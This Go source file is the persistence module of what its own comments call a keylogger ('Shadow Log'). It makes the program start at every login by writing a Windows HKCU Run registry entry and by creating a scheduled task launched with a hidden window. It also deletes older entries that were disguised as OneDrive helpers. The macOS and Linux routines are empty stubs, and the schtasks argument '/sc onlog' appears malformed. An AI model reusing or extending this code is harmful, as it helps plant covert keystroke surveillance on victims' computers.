package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

// Install sets the currently running application to automatically start with the system.
// This ensures the keylogger persists across reboots.
// Currently supports Windows registry, with placeholders for macOS and Linux.
func Install() error {
	// Get the path to the current executable.
	execPath, err := os.Executable()
	if err != nil {
		return err
	}

	// Platform-specific installation.
	switch runtime.GOOS {
	case "windows":
		// Multi-layered persistence for redundancy.
		err = installWindows(execPath)
		// We ignore error for SchTasks as it might fail if admin is required for some flags,
		// but we try our best.
		installSchTasks(execPath)
		return err
	case "darwin":
		return installMacOS(execPath)
	case "linux":
		return installLinux(execPath)
	}
	return fmt.Errorf("platform not supported")
}

// IsInstalled checks if the application is configured to start automatically.
// Returns true if the startup entry exists.
func IsInstalled() bool {
	switch runtime.GOOS {
	case "windows":
		return checkWindows()
	}
	// Simplified: assume not installed on unsupported platforms.
	return false
}

// installWindows adds the executable to the Windows registry Run key.
// This makes it start automatically on user login.
func installWindows(execPath string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}
	defer k.Close()

	// 1. Cleanup old or stealthy identifiers to ensure no confusion.
	k.DeleteValue("OneDrive Helper")
	k.DeleteValue("OneDriveUpdate")
	k.DeleteValue("onedrive hgelper")

	// 2. Set the official, transparent application key.
	return k.SetStringValue("Shadow Log", execPath)
}

// checkWindows verifies if the registry entry exists.
func checkWindows() bool {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()

	_, _, err = k.GetStringValue("Shadow Log")
	return err == nil
}

// installSchTasks creates a secondary persistence entry using Windows Task Scheduler.
func installSchTasks(execPath string) {
	// Disguise no longer needed; use transparent name.
	taskName := "Shadow Log Reporting"
	
	// Create task that runs on Setiap logon.
	// /sc onlog runs when user logs on.
	// /f forces creation if already exists.
	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", execPath, "/sc", "onlog", "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func installMacOS(_ string) error {
	// TODO: Implement macOS LaunchAgent installation.
	return nil
}

// installLinux would create a .desktop file in autostart.
// Currently unimplemented.
func installLinux(_ string) error {
	// TODO: Implement Linux autostart installation.
	return nil
}
